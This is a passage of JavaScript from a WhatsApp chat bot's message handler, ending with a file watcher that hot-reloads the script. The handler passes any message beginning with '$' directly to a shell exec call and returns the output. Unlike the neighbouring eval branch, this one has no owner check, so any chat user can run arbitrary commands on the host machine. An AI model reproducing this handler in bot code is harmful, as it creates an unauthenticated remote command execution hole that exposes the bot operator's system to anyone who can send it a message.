break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})